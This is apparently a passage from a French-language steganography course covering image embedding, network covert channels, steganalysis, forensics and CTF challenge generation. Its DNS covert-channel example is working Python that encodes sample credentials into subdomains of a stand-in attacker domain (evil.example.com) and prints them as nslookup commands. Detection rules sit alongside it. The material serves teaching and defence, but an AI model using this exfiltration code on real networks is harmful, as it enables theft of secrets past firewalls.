    # Zone texturée (droite)
    for i in range(256):
        for j in range(128, 256):
            img[i, j] = 128 + 40 * np.sin(i * 0.5) * np.cos(j * 0.3)
    img += np.random.normal(0, 5, img.shape)
    img = np.clip(img, 0, 255)

    cost = compute_wow_cost_map(img)

    # Afficher les statistiques
    left_cost = cost[:, :128].mean()   # zone lisse
    right_cost = cost[:, 128:].mean()  # zone texturée

    print("Carte de coûts WOW (approximation) :")
    print(f"  Coût moyen zone LISSE     : {left_cost:.4f} (élevé = peu d'embedding)")
    print(f"  Coût moyen zone TEXTURÉE  : {right_cost:.4f} (faible = beaucoup d'embedding)")
    print(f"  Ratio                     : {left_cost/right_cost:.1f}× plus coûteux dans la zone lisse")
    print(f"\n→ WOW place {left_cost/(left_cost+right_cost)*100:.0f}% moins de données dans la zone lisse")

demo_adaptive_embedding()
```

---

# ════════════════════════════════════════════════════════
# PARTIE III — STÉGANOGRAPHIE RÉSEAU
# ════════════════════════════════════════════════════════

---

## Chapitre 7 : Canaux Cachés dans TCP/IP

### 7.1 Taxonomie des canaux cachés réseau

```
CANAUX CACHÉS RÉSEAU (Covert Channels) :

1. CANAUX DE STOCKAGE :
   → Information encodée dans des CHAMPS de protocole
   → Exemples :
     - Champ ID IP (16 bits, normalement aléatoire)
     - Champ TTL (8 bits, normalement 64, 128 ou 255)
     - Options TCP (timestamp, NOP padding)
     - Bits réservés dans les en-têtes
     - Padding TLS

2. CANAUX DE TIMING :
   → Information encodée dans les DÉLAIS entre paquets
   → Exemples :
     - Délai court = bit 0, délai long = bit 1
     - Nombre de paquets par intervalles
     - Inter-arrival time modulation

3. CANAUX HYBRIDES :
   → Combinaison stockage + timing

DÉTECTION :
   Stockage  → analyse des valeurs de champs (easy/medium)
   Timing    → analyse statistique des délais (hard)
   Hybrides  → outils spécialisés (très hard)
```

### 7.2 Canal caché dans le champ IP ID

```python
#!/usr/bin/env python3
"""
covert_channel_ip.py — Canal caché dans le champ ID des paquets IP
USAGE PÉDAGOGIQUE UNIQUEMENT — ne pas utiliser sur des réseaux non autorisés
Prérequis : pip install scapy (et droits root)
"""

# from scapy.all import IP, ICMP, send, sniff  # Décommenter si scapy installé
import struct
import socket


def concept_ip_id_channel():
    """
    Démontre LE CONCEPT du canal caché IP ID.
    Le champ IP Identification (16 bits) est censé être
    un compteur de fragmentation.
    En pratique, sur de nombreux OS, il peut contenir
    des données arbitraires sans que quiconque ne le vérifie.
    
    ENCODAGE :
    - Envoyer un paquet IP avec ID = données à transmettre
    - Le récepteur lit le champ ID de chaque paquet
    
    DÉCODAGE :
    - Reconstituer les bytes depuis les champs ID
    - Déchiffrer si chiffrement utilisé
    
    LIMITATION :
    - 16 bits par paquet = 2 bytes par paquet
    - Pour 1 KB de données : 512 paquets ICMP
    - Facilement détectable par IDS (valeurs non séquentielles)
    """

    message = "SECRET"
    print(f"Message à encoder : '{message}'")
    print(f"\nSimulation encodage dans champ IP ID :")
    print(f"{'Paquet':>8} {'Char':>6} {'IP ID (hex)':>12} {'IP ID (dec)':>12}")

    packets = []
    for i, char in enumerate(message):
        # Encoder le caractère dans les 8 LSBs du champ ID
        ip_id = (i << 8) | ord(char)  # index dans MSB, char dans LSB
        packets.append(ip_id)
        print(f"{i+1:>8} {char:>6} {ip_id:#010x} {ip_id:>12}")

    # Décodage
    print(f"\nDécodage :")
    decoded = ''.join(chr(pid & 0xFF) for pid in packets)
    print(f"Message récupéré : '{decoded}'")


concept_ip_id_channel()
```

### 7.3 Canal caché DNS

```python
#!/usr/bin/env python3
"""
covert_dns.py — Canal caché via requêtes DNS
Technique utilisée par des malwares pour exfiltrer des données
et contourner les firewalls (DNS rarement filtré).
USAGE PÉDAGOGIQUE ET DÉFENSIF UNIQUEMENT.
"""

import base64
import hashlib


class DNSCovertChannel:
    """
    Exfiltration de données via requêtes DNS.
    
    COMMENT ÇA MARCHE :
    1. L'attaquant contrôle un domaine (evil.com)
       et son serveur DNS autoritaire.
    2. Le client encode les données dans des sous-domaines :
       [données_b32].[compteur].evil.com
    3. Les requêtes DNS passent les firewalls (DNS = port 53, toujours autorisé)
    4. Le serveur DNS de l'attaquant reçoit les requêtes
       et extrait les données des sous-domaines.
    
    EXEMPLE :
    Exfiltrer "password123" :
    → cGFzc3dvcmQ.01.evil.com (requête A)
    → MTIz.02.evil.com         (requête A)
    
    DÉTECTION :
    - DNS queries vers des domaines inconnus
    - Sous-domaines très longs et encodés (base32/64)
    - Nombre élevé de requêtes vers même domaine
    - Pas de réponse MX/A valide (DNS sinkhole)
    """

    def __init__(self, domain: str, max_label_length: int = 63):
        """
        domain : domaine contrôlé par l'attaquant
        max_label_length : longueur max d'un label DNS (RFC 1035 = 63)
        """
        self.domain = domain
        self.max_label = max_label_length
        # Espace disponible par requête après le compteur
        # Format: [data].[seq].[domain] → data max = 63 - 3 (seq) - 1 (dot)
        self.bytes_per_query = (max_label_length * 5) // 8  # base32 overhead

    def encode(self, data: bytes) -> list:
        """
        Encode des données en une liste de noms DNS.
        Retourne la liste des requêtes à effectuer.
        """
        # Encoder en base32 (DNS = case-insensitive, base64 pas safe)
        encoded = base64.b32encode(data).decode().lower().rstrip('=')

        # Découper en chunks de max_label_length
        chunks = []
        for i in range(0, len(encoded), self.max_label):
            chunk = encoded[i:i + self.max_label]
            seq = f"{len(chunks):03d}"
            dns_query = f"{chunk}.{seq}.{self.domain}"
            chunks.append(dns_query)

        return chunks

    def decode(self, dns_queries: list) -> bytes:
        """Decode une liste de requêtes DNS en données originales."""
        # Trier par numéro de séquence
        sorted_queries = sorted(dns_queries, key=lambda q: q.split('.')[1])

        # Extraire les chunks de données
        encoded = ''
        for query in sorted_queries:
            parts = query.split('.')
            encoded += parts[0]

        # Ajouter le padding base32
        padding = (8 - len(encoded) % 8) % 8
        encoded += '=' * padding

        return base64.b32decode(encoded.upper())


# Démonstration
channel = DNSCovertChannel("evil.example.com")

secret_data = b"credentials: admin:password123\napi_key: sk-abc123xyz"
print(f"Données à exfiltrer ({len(secret_data)} bytes) :")
print(f"  {secret_data.decode()}")

queries = channel.encode(secret_data)
print(f"\nRequêtes DNS générées ({len(queries)}) :")
for q in queries:
    print(f"  nslookup {q}")

recovered = channel.decode(queries)
print(f"\nDonnées récupérées :")
print(f"  {recovered.decode()}")
print(f"  Intégrité : {'✅' if recovered == secret_data else '❌'}")

print(f"\n[BLUE TEAM] Règles de détection :")
print(f"  → Alerter sur : labels DNS > 30 chars contenant [a-z2-7]{{20,}}")
print(f"  → Alerter sur : > 50 requêtes/min vers même domaine")
print(f"  → Analyser : longueur anormale des noms de domaine (> 100 chars)")
```

### 7.4 Canal caché par timing

```python
#!/usr/bin/env python3
"""
timing_channel.py — Canal caché par délai entre paquets
"""

import time
import threading
import random


class TimingCovertChannel:
    """
    Canal caché basé sur les délais entre transmissions.
    
    ENCODAGE :
    bit 0 → délai court (T0 secondes)
    bit 1 → délai long  (T1 secondes)
    
    AVANTAGES vs Stockage :
    - Aucune modification des paquets (contenu légitime)
    - Passe les DPI (Deep Packet Inspection) qui inspectent le contenu
    
    INCONVÉNIENTS :
    - Très lent (quelques bits/seconde seulement)
    - Sensible au jitter réseau (bruit dans les délais)
    - Détectable par analyse statistique des inter-arrival times
    
    APPLICATIONS RÉELLES :
    - Exfiltration depuis des réseaux très surveillés
    - Communication entre processus isolés (side channel)
    - Bypass de Tor ou VPN qui masquent le contenu mais pas le timing
    """

    def __init__(self, delay_0: float = 0.1, delay_1: float = 0.3,
                 jitter: float = 0.01):
        """
        delay_0 : délai pour bit 0 (secondes)
        delay_1 : délai pour bit 1 (secondes)
        jitter  : bruit aléatoire ajouté (réalisme réseau)
        """
        self.T0 = delay_0
        self.T1 = delay_1
        self.jitter = jitter
        self.threshold = (delay_0 + delay_1) / 2  # seuil de décodage

    def encode_bit(self, bit: int) -> float:
        """Retourne le délai pour un bit donné."""
        base_delay = self.T1 if bit else self.T0
        noise = random.uniform(-self.jitter, self.jitter)
        return max(0, base_delay + noise)

    def decode_delay(self, delay: float) -> int:
        """Décode un délai en bit."""
        return 1 if delay >= self.threshold else 0

    def simulate_transmission(self, message: bytes):
        """Simule une transmission et une réception."""
        print(f"Message : {message!r}")
        print(f"Délai bit 0 : {self.T0*1000:.0f}ms | Délai bit 1 : {self.T1*1000:.0f}ms")
        print(f"Seuil de décodage : {self.threshold*1000:.0f}ms\n")

        # ÉMISSION
        sent_delays = []
        for byte in message:
            for i in range(7, -1, -1):
                bit = (byte >> i) & 1
                delay = self.encode_bit(bit)
                sent_delays.append(delay)

        # RÉCEPTION & DÉCODAGE
        received_bits = [self.decode_delay(d) for d in sent_delays]

        # Reconstituer les bytes
        decoded = bytearray()
        for i in range(0, len(received_bits) - 7, 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | received_bits[i + j]
            decoded.append(byte)

        print(f"Décodé  : {bytes(decoded)!r}")
        print(f"Succès  : {'✅' if bytes(decoded) == message else '❌ (erreurs de jitter)'}")

        # Statistiques
        bit_errors = sum(
            1 for sent_d, recv_b in zip(sent_delays, received_bits)
            if (sent_d >= self.threshold) != recv_b
        )
        print(f"Erreurs bits : {bit_errors}/{len(sent_delays)} ({bit_errors/len(sent_delays)*100:.1f}%)")

        total_time = sum(sent_delays)
        throughput = len(message) * 8 / total_time
        print(f"Débit   : {throughput:.2f} bits/sec = {throughput/8:.2f} bytes/sec")


channel = TimingCovertChannel(delay_0=0.05, delay_1=0.15, jitter=0.005)
channel.simulate_transmission(b"Hi")
```

---

# ════════════════════════════════════════════════════════
# PARTIE IV — STÉGANALYSE (DÉTECTION)
# ════════════════════════════════════════════════════════

---

## Chapitre 10 : Détection Statistique

### 10.1 Pourquoi LSB est détectable

```
PROPRIÉTÉ DES IMAGES NATURELLES (Prior Image Model) :
  Dans une image naturelle, les paires de valeurs adjacentes
  (2n, 2n+1) ont une distribution quasi-égale.
  Exemple : le nombre de pixels avec valeur 100 ≈ nombre avec 101.
  
  Ce phénomène vient de la corrélation naturelle entre pixels voisins.

LSB STEGANOGRAPHIE NAÏVE BRISE CETTE PROPRIÉTÉ :
  Si on remplace tous les LSBs par des bits aléatoires (message),
  les valeurs paires et impaires deviennent EXACTEMENT équiprobables.
  C'est une signature statistique distincte !

RS ANALYSIS (Fridrich, 2001) :
  Divise les pixels en groupes et mesure le "lissage" (smoothness).
  Calcule 4 quantités : R, S, R₋₁, S₋₁
  
  Propriété des images naturelles :
  R ≈ R₋₁  et  S ≈ S₋₁
  
  Après LSB embedding :
  R > R₋₁  (différence proportionnelle au taux d'embedding)
  
  Estimation du taux : α̂ = f(R, S, R₋₁, S₋₁)
```

### 10.2 Détection statistique — chi-carré test

```python
#!/usr/bin/env python3
"""
steganalysis_chi2.py — Détection LSB par test chi-carré (PoV Attack)
Référence : Westfeld & Pfitzmann (2000)
"""

import numpy as np
from PIL import Image
from scipy import stats


def chi_square_attack(image_path: str, channel: int = 0) -> dict:
    """
    Chi-Square Attack (Westfeld & Pfitzmann, 2000).
    
    Exploite la propriété que la stéganographie LSB naïve
    rend les paires (2k, 2k+1) équiprobables.
    
    H0 : image naturelle (paires non équiprobables)
    H1 : image stéganographiée (paires équiprobables)
    
    Retourne la probabilité que l'image contienne un message.
    """
    img = np.array(Image.open(image_path))

    if img.ndim == 3:
        data = img[:, :, channel].flatten()
    else:
        data = img.flatten()

    # Compter les fréquences de chaque valeur (0-255)
    freqs = np.bincount(data, minlength=256)

    # Former les paires (2k, 2k+1) pour k = 0..127
    pairs = [(freqs[2*k], freqs[2*k+1]) for k in range(128)]

    # Fréquences observées et attendues
    # H0 LSB : les deux membres d'une paire devraient être égaux
    chi2_values = []
    for f0, f1 in pairs:
        total = f0 + f1
        if total == 0:
            continue
        expected = total / 2  # si LSB aléatoire → moitié-moitié
        if expected > 0:
            chi2 = (f0 - expected)**2 / expected + (f1 - expected)**2 / expected
            chi2_values.append(chi2)

    if not chi2_values:
        return {"probability": 0, "chi2": 0, "dof": 0}

    total_chi2 = sum(chi2_values)
    dof = len(chi2_values)

    # p-value : probabilité d'obtenir ce chi2 par hasard si H0 vraie
    # Faible p-value → rejeter H0 → image probablement stéganographiée
    p_value = 1 - stats.chi2.cdf(total_chi2, dof)

    # Probabilité de détection (1 - p_value pour notre usage)
    detection_prob = 1 - p_value

    return {
        "probability_stego": round(detection_prob, 4),
        "chi2_statistic": round(total_chi2, 2),
        "degrees_of_freedom": dof,
        "interpretation": (
            "🔴 Probablement stéganographié" if detection_prob > 0.95
            else "🟡 Suspect" if detection_prob > 0.5
            else "🟢 Probablement naturelle"
        )
    }


def sliding_window_detection(image_path: str, window_size: int = 64) -> list:
    """
    Détection par fenêtre glissante.
    Permet de localiser approximativement où le message est caché.
    
    Si le message est encodé séquentiellement (pas de dispersion),
    la détection chi2 sera élevée dans les premières fenêtres
    et faible dans les dernières.
    """
    img = np.array(Image.open(image_path).convert('L'))
    flat = img.flatten()
    results = []

    for start in range(0, len(flat) - window_size, window_size):
        window = flat[start:start + window_size]
        freqs = np.bincount(window, minlength=256)
        pairs = [(freqs[2*k], freqs[2*k+1]) for k in range(128)]
        chi2 = sum(
            (f0 - (f0+f1)/2)**2 / max((f0+f1)/2, 1) * 2
            for f0, f1 in pairs
            if f0 + f1 > 0
        )
        results.append((start, chi2))

    return results


# Test
def demo_steganalysis():
    # Créer images de test
    print("=== STÉGANALYSE STATISTIQUE ===\n")

    # Image propre
    clean = np.random.randint(0, 256, (256, 256), dtype=np.uint8)
    Image.fromarray(clean).save('/tmp/test_clean.png')

    # Image stéganographiée naïvement (remplacer tous les LSBs)
    stego = clean.copy()
    stego = (stego & 0xFE) | np.random.randint(0, 2, stego.shape, dtype=np.uint8)
    Image.fromarray(stego).save('/tmp/test_stego.png')

    for name, path in [("Image propre", '/tmp/test_clean.png'),
                        ("Image stéganographiée", '/tmp/test_stego.png')]:
        result = chi_square_attack(path)
        print(f"{name} :")
        print(f"  Probabilité stégo : {result['probability_stego']:.1%}")
        print(f"  Interprétation    : {result['interpretation']}")
        print()

demo_steganalysis()
```

### 10.3 Outils de stéganalyse disponibles

```bash
# ══════ DÉTECTION D'IMAGES ══════

# StegDetect — outil classique (JPEG)
$ apt install stegdetect
$ stegdetect -t jphide,jsteg,f5,outguess image.jpg

# StegExpose — détecteur Python basé sur statistiques
$ git clone https://github.com/b3dk7/StegExpose
$ java -jar StegExpose.jar images/ threshold output.csv

# zsteg — détecteur PNG/BMP (Ruby)
$ gem install zsteg
$ zsteg image.png
$ zsteg -a image.png  # tous les modes

# stegsolve — outil visuel (Java)
$ java -jar stegsolve.jar image.png
# → Permet d'inspecter chaque plan de bits visuellement

# binwalk — détection de fichiers cachés
$ binwalk image.png
$ binwalk -e image.png  # extraire

# foremost — récupération de fichiers
$ foremost -i image.png -o output/

# ══════ DÉTECTION RÉSEAU ══════

# Wireshark — filtres pour canaux cachés
$ wireshark -r capture.pcap
# Filtres utiles :
# ip.id != 0  (pour voir les IDs non nuls)
# dns.qry.name matches "[a-z2-7]{20,}"  (DNS covert channel)
# frame.time_delta > 0.2  (timing channel)

# NetworkMiner — extraction de fichiers depuis captures
$ mono NetworkMiner.exe capture.pcap

# ══════ INVESTIGATION FORENSIQUE ══════

# ExifTool — métadonnées (stéganographie dans EXIF)
$ exiftool image.jpg
$ exiftool -all= image.jpg  # nettoyer les métadonnées

# Strings — texte caché dans fichiers binaires
$ strings -n 8 image.png | grep -v "^[[:alpha:]]"

# Hexdump — inspection bas niveau
$ xxd image.png | head -50
$ xxd image.png | tail -50  # chercher à la fin du fichier
```

---

# ════════════════════════════════════════════════════════
# PARTIE V — STÉGANOGRAPHIE AVANCÉE
# ════════════════════════════════════════════════════════

---

## Chapitre 14 : Stéganographie et Cryptographie Combinées

### 14.1 Le schéma optimal 2026

```
SCHÉMA RECOMMANDÉ pour communications sensibles :

1. Chiffrer le message (cryptographie)
   → AES-256-GCM avec clé dérivée via HKDF
   → Rend le contenu illisible même si la stéganographie est percée

2. Compresser le chiffré (optionnel)
   → Le chiffré AES a l'entropie max → incompressible
   → Ne pas compresser après chiffrement (perte de temps)

3. Disperser stéganographiquement dans le carrier
   → WOW ou méthode adaptive pour minimiser la détectabilité
   → Utiliser un carrier naturellement bruité

4. Transmettre le carrier modifié (stego object)

SÉCURITÉ :
   Si stéganalyse détecte la présence d'un message :
   → le contenu reste protégé par AES-256
   
   Si déchiffrement est cassé (futur ordinateur quantique) :
   → la stéganographie peut encore protéger (si non détectée)
   
   Double protection orthogonale.
```

### 14.2 Implémentation complète — Crypto + Stégo

```python
#!/usr/bin/env python3
"""
crypto_stego_combined.py — Système complet cryptographie + stéganographie
pip install cryptography Pillow
"""

import os
import json
import struct
import hashlib
from pathlib import Path
from PIL import Image
import numpy as np
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey


class SecureStego:
    """
    Système de communication stéganographique sécurisé.
    
    Combinaison :
    - Ed25519 pour authentification (qui a envoyé)
    - HKDF pour dérivation de clé (depuis mot de passe ou DH)
    - AES-256-GCM pour chiffrement (confidentialité + intégrité)
    - LSB dispersé pour dissimulation (cache l'existence)
    """

    VERSION = 1
    MAGIC = b'\xDE\xAD\xC0\xDE'  # marqueur de début

    def __init__(self, password: str):
        """Dérive les clés depuis le mot de passe."""
        # Dériver une clé maître depuis le mot de passe
        master = HKDF(
            algorithm=hashes.SHA256(),
            length=64,
            salt=b'SecureStego-v1-salt',
            info=b'master-key-derivation',
        ).derive(password.encode())

        self.aes_key = master[:32]   # AES-256
        self.embed_key = master[32:] # clé de dispersion

    def _derive_pixel_sequence(self, total: int) -> list:
        """Dérive un ordre pseudo-aléatoire de pixels depuis la clé."""
        import random
        seed = int.from_bytes(self.embed_key[:8], 'big')
        rng = random.Random(seed)
        seq = list(range(total))
        rng.shuffle(seq)
        return seq

    def embed(self, cover_path: str, message: bytes,
              output_path: str,
              signing_key: Ed25519PrivateKey = None) -> None:
        """
        Embeds a message into a cover image.
        
        Format du payload :
        [MAGIC 4B][VERSION 1B][FLAGS 1B][NONCE 12B][SIG_LEN 2B][SIGN][CT_LEN 4B][CT]
        """
        # 1. Signer le message (optionnel)
        signature = b''
        flags = 0x00
        if signing_key:
            signature = signing_key.sign(message)
            flags |= 0x01

        # 2. Chiffrer avec AES-256-GCM
        nonce = os.urandom(12)
        aesgcm = AESGCM(self.aes_key)
        aad = self.MAGIC + bytes([self.VERSION, flags])
        ciphertext = aesgcm.encrypt(nonce, message, aad)

        # 3. Construire le payload complet
        payload = (
            self.MAGIC
            + bytes([self.VERSION, flags])
            + nonce
            + struct.pack('>H', len(signature))
            + signature
            + struct.pack('>I', len(ciphertext))
            + ciphertext
        )

        # 4. Encoder dans l'image (LSB dispersé)
        cover = Image.open(cover_path).convert('RGB')
        pixels = np.array(cover, dtype=np.uint8)
        total_lsbs = pixels.size

        payload_bits = []
        for byte in payload:
            for i in range(7, -1, -1):
                payload_bits.append((byte >> i) & 1)

        if len(payload_bits) > total_lsbs:
            raise ValueError(
                f"Payload trop grand ({len(payload)//1024:.1f} KB) "
                f"pour cette image (capacité : {total_lsbs//8//1024:.1f} KB)"
            )

        flat = pixels.flatten()
        sequence = self._derive_pixel_sequence(len(flat))

        for i, bit in enumerate(payload_bits):
            idx = sequence[i]
            flat[idx] = (flat[idx] & 0xFE) | bit

        stego_arr = flat.reshape(pixels.shape)
        Image.fromarray(stego_arr, 'RGB').save(output_path, 'PNG')

        usage = len(payload_bits) / total_lsbs * 100
        print(f"✅ Embedded: {len(message)} bytes → {output_path}")
        print(f"   Payload : {len(payload)} bytes ({usage:.2f}% de la capacité)")

    def extract(self, stego_path: str,
                verify_key=None) -> bytes:
        """Extrait et déchiffre le message depuis le stego object."""
        stego = Image.open(stego_path).convert('RGB')
        pixels = np.array(stego, dtype=np.uint8)
        flat = pixels.flatten()
        sequence = self._derive_pixel_sequence(len(flat))

        def read_bits(n_bits: int, start: int) -> bytes:
            bits = [flat[sequence[start + i]] & 1 for i in range(n_bits)]
            result = []
            for j in range(0, len(bits) - 7, 8):
                byte = 0
                for k in range(8):
                    byte = (byte << 1) | bits[j + k]
                result.append(byte)
            return bytes(result)

        # Lire l'en-tête minimal (MAGIC + VERSION + FLAGS + NONCE)
        header_size = 4 + 1 + 1 + 12  # 18 bytes
        header = read_bits(header_size * 8, 0)

        if header[:4] != self.MAGIC:
            raise ValueError("Pas de message ou mauvais mot de passe")

        version = header[4]
        flags = header[5]
        nonce = header[6:18]

        # Lire la signature (si présente)
        offset = header_size
        sig_len = struct.unpack('>H', read_bits(16, offset * 8))[0]
        offset += 2
        signature = read_bits(sig_len * 8, offset * 8) if sig_len > 0 else b''
        offset += sig_len

        # Lire le ciphertext
        ct_len = struct.unpack('>I', read_bits(32, offset * 8))[0]
        offset += 4
        ciphertext = read_bits(ct_len * 8, offset * 8)

        # Déchiffrer
        aad = self.MAGIC + bytes([version, flags])
        aesgcm = AESGCM(self.aes_key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, aad)

        # Vérifier la signature
        if flags & 0x01 and verify_key and signature:
            from cryptography.exceptions import InvalidSignature
            try:
                verify_key.verify(signature, plaintext)
                print("✅ Signature valide")
            except InvalidSignature:
                raise ValueError("⚠️  Signature invalide — message falsifié !")
        elif flags & 0x01 and not verify_key:
            print("⚠️  Message signé mais pas de clé de vérification fournie")

        return plaintext


# Démonstration
def demo_secure_stego():
    print("=== STÉGANOGRAPHIE SÉCURISÉE (Crypto + Stégo) ===\n")

    # Créer une image de couverture
    img = Image.new('RGB', (800, 600))
    pixels = img.load()
    for x in range(800):
        for y in range(600):
            pixels[x, y] = (
                int(128 + 64 * np.sin(x * 0.05)),
                int(128 + 64 * np.cos(y * 0.05)),
                int(128 + 64 * np.sin((x+y) * 0.03))
            )
    img.save('/tmp/cover_secure.png', 'PNG')

    # Créer une paire de clés pour la signature
    signing_key = Ed25519PrivateKey.generate()
    verify_key = signing_key.public_key()

    password = "motdepasse_secret_2026"
    stego = SecureStego(password)

    message = b"""
    Document confidentiel — classification CONFIDENTIEL
    Date : 2026-01-10
    Objet : Transmission sécurisée via stéganographie
    Contenu : Les données importantes suivent...
    Signature : Alice Martin
    """

    # Encoder
    stego.embed(
        '/tmp/cover_secure.png',
        message.strip(),
        '/tmp/stego_secure.png',
        signing_key=signing_key
    )

    # Décoder
    print("\n[Décodage]")
    recovered = stego.extract('/tmp/stego_secure.png', verify_key=verify_key)
    print(f"Message récupéré ({len(recovered)} bytes) :")
    print(recovered.decode())

    # Vérifier l'invisibilité
    cover_arr = np.array(Image.open('/tmp/cover_secure.png'))
    stego_arr = np.array(Image.open('/tmp/stego_secure.png'))
    diff = np.abs(cover_arr.astype(int) - stego_arr.astype(int))
    psnr_val = 10 * np.log10(255**2 / (diff**2).mean())
    print(f"\nPSNR : {psnr_val:.1f} dB {'(imperceptible)' if psnr_val > 50 else '(visible)'}")


demo_secure_stego()
```

---

## Chapitre 15 : Applications Réelles et Forensique

### 15.1 Cas réels documentés

```
MALWARES UTILISANT LA STÉGANOGRAPHIE (APT) :

Duqu 2.0 (2015) — Kaspersky Lab
  → Images JPG en header HTTP contenant des commandes C2
  → Les pixels modifiés encodaient les instructions du malware

Stegoloader (2015) — Dell SecureWorks
  → Trojan dissimulant ses modules dans des PNG téléchargés depuis des
    sites légitimes (dont Wikipedia)

Lurk (2016) — Kaspersky
  → Embeddait un downloader dans des images GIF de publicités en ligne

Hammertoss (FireEye, 2015)
  → Backdoor russe utilisant Twitter + stéganographie dans images
  → Générait chaque jour un nouveau compte Twitter selon un algorithme
  → Téléchargeait les images de ce compte et en extrayait les commandes

SilverFish / Turla (2021)
  → Exfiltrait des données en encodant dans du trafic HTTPS légitime
    (images d'un site de e-commerce compromis)

CL0P (2023)
  → Utilisait des documents Word avec stéganographie dans les images
    pour bypasser les solutions DLP (Data Loss Prevention)

BLUE TEAM — Contre-mesures :
  → Stripping de métadonnées à la frontière réseau
  → Re-compression des images (détruit LSB)
  → Analyse statistique des images traversant le périmètre
  → Surveillance des requêtes DNS avec labels longs
  → Baseline des délais réseau normaux (timing channels)
```

### 15.2 Forensique stéganographique

```bash
# Procédure d'investigation forensique complète

# 1. COLLECTE — Identifier les fichiers suspects
$ find /suspicious/ -name "*.jpg" -o -name "*.png" | \
  xargs -I{} identify -verbose {} | grep -E "(size|format)"

# 2. TRIAGE — Tests rapides
$ for f in *.png; do
    echo "=== $f ==="
    zsteg "$f" 2>/dev/null | head -5
    binwalk "$f" | grep -v "0x0"
  done

# 3. ANALYSE — Tests approfondis
# a) Analyse LSB visuelle
$ stegsolve.jar image.png  # inspecter plan par plan

# b) Test chi-carré
$ python3 steganalysis_chi2.py image.png

# c) Analyse des métadonnées
$ exiftool -a -u image.png

# d) Signature de fichiers cachés
$ file --brief image.png  # vérifier la vraie signature

# e) Strings dans l'image
$ strings -n 6 image.png | grep -v "^[^[:print:]]"

# 4. EXTRACTION — Tenter l'extraction
# OutGuess
$ outguess -r suspicious.jpg output.txt

# Steghide
$ steghide extract -sf image.jpg -p password

# stegdetect
$ stegdetect -t jphide,jsteg,f5,outguess -s 10 image.jpg

# 5. CORRÉLATION — Chronologie
# Comparer les timestamps des images avec l'incident
$ exiftool -DateTimeOriginal image.jpg
$ stat image.jpg

# 6. RAPPORT — Documenter les findings
# Hash de l'image originale pour la chaîne de custody
$ sha256sum image.jpg | tee image.jpg.sha256
$ md5sum image.jpg
```

---

# ════════════════════════════════════════════════════════
# PARTIE VI — ATELIERS ET CHALLENGES
# ════════════════════════════════════════════════════════

---

## Chapitre 17 : CTF Stéganographie

### 17.1 Méthodologie CTF — Checklist complète

```
WORKFLOW POUR UN CHALLENGE STÉGANOGRAPHIE CTF :

ÉTAPE 1 : IDENTIFICATION DU FORMAT
□ file challenge.xxx
□ xxd challenge.xxx | head -20  (magic bytes)
□ binwalk challenge.xxx
□ strings challenge.xxx | grep -E "CTF|flag|key|secret"

ÉTAPE 2 : MÉTADONNÉES
□ exiftool -a challenge.xxx
□ Chercher : commentaires, GPS, UserComment, Description

ÉTAPE 3 : SELON LE FORMAT

  IMAGE PNG/BMP :
  □ zsteg -a challenge.png     (LSB toutes combinaisons)
  □ stegsolve.jar              (plan de bits visuel)
  □ python3 -c "from PIL import Image; img=Image.open('f.png');
     print([img.getpixel((0,y)) for y in range(10)])"

  IMAGE JPEG :
  □ steghide extract -sf challenge.jpg -p ""  (mot de passe vide)
  □ stegdetect -t jphide,jsteg,f5,outguess challenge.jpg
  □ jsteg reveal challenge.jpg output.txt

  AUDIO :
  □ Audacity : ouvrir, regarder le spectrogramme (View → Spectrogram)
  □ Chercher des zones anormales en hautes fréquences
  □ morse2text si signal morse détecté
  □ LSB dans les samples : sox challenge.wav -t raw - | strings

  TEXTE / PDF :
  □ Chercher des caractères invisibles (espace, ZWSP U+200B)
  □ Acrostiche (premières lettres de chaque ligne/mot)
  □ Différences typographiques (police, taille)
  □ Whitespace steganography (snow, pwdump)

  RÉSEAU (pcap) :
  □ wireshark : inspecter les champs inhabituels
  □ tshark -r challenge.pcap -T fields -e ip.id | sort | uniq -c
  □ tshark -r challenge.pcap -T fields -e dns.qry.name

ÉTAPE 4 : BRUTE FORCE (dernier recours)
□ stegcracker challenge.jpg wordlist.txt  (mots de passe)
□ rockyou.txt comme wordlist

ÉTAPE 5 : ANALYSE AVANCÉE
□ Test chi-carré (chi2_attack.py)
□ RS Analysis (python)
□ Recherche de patterns dans les LSBs
```

### 17.2 Challenges pratiques

```python
#!/usr/bin/env python3
"""
ctf_challenges.py — Série de challenges stéganographie progressifs

Chaque challenge génère un fichier avec un message caché.
L'étudiant doit trouver la méthode et extraire le flag.
"""

import os
import struct
import random
from PIL import Image
import numpy as np
import wave
import struct as st


class ChallengeGenerator:
    """Génère des challenges stéganographiques."""

    @staticmethod
    def challenge_1_basic_lsb(output: str, flag: str = "FLAG{lsb_is_easy}"):
        """
        NIVEAU : Débutant
        TECHNIQUE : LSB naïf (séquentiel, sans dispersion, sans chiffrement)
        INDICE : Inspecter les LSBs des premiers pixels du canal rouge
        """
        img = np.zeros((200, 200, 3), dtype=np.uint8)
        for x in range(200):
            for y in range(200):
                img[y, x] = [x % 256, y % 256, (x+y) % 256]

        flat = img[:, :, 0].flatten()  # Canal rouge seulement
        flag_bytes = flag.encode() + b'\x00'

        bits = []
        for byte in flag_bytes:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)

        for i, bit in enumerate(bits):
            flat[i] = (flat[i] & 0xFE) | bit

        img[:, :, 0] = flat.reshape(200, 200)
        Image.fromarray(img).save(output)
        print(f"✅ Challenge 1 généré : {output}")
        print(f"   INDICE : LSB séquentiel, canal rouge seulement")

    @staticmethod
    def challenge_2_metadata_trick(output: str, flag: str = "FLAG{exif_is_everywhere}"):
        """
        NIVEAU : Débutant
        TECHNIQUE : Métadonnées EXIF (commentaire)
        INDICE : Lire les métadonnées du fichier
        """
        img = Image.new('RGB', (100, 100), color=(128, 64, 192))
        img.save(output, comment=f"Hidden: {flag}")
        print(f"✅ Challenge 2 généré : {output}")
        print(f"   INDICE : exiftool {output}")

    @staticmethod
    def challenge_3_file_in_file(output: str, flag: str = "FLAG{concat_magic}"):
        """
        NIVEAU : Intermédiaire
        TECHNIQUE : Fichier ZIP caché après l'EOF d'une image PNG
        INDICE : binwalk, hexdump de la fin du fichier
        """
        # PNG normal
        img = Image.new('RGB', (100, 100), color=(0, 128, 255))
        import io
        png_bytes = io.BytesIO()
        img.save(png_bytes, 'PNG')
        png_data = png_bytes.getvalue()

        # Créer un ZIP en mémoire avec le flag
